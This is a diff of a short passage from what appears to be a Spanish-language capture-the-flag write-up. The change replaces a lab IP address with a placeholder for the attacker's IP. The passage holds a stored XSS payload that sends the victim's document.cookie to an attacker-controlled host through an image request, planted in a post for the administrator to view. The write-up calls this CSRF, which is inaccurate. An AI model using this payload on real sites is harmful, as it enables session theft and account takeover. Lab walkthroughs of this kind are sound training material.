@@ -146,7 +146,7 @@ y comprobamos que funcionó
 Ya sabiendo que es vulnerable y recordando que podemos reportar publicaciones al usuario administrador, pensé en que los tiros iban por un CSRF, así que creé una publicación con el siguiente contenido:
 
 ```html
-<script>document.write("<img src='http://10.9.242.217/imagen.jpg?cookie=" + document.cookie + "'>")</script>
+<script>document.write("<img src='http://[TU_IP_DE_ATACANTE]/imagen.jpg?cookie=" + document.cookie + "'>")</script>
 ```
 
 <p align="center">
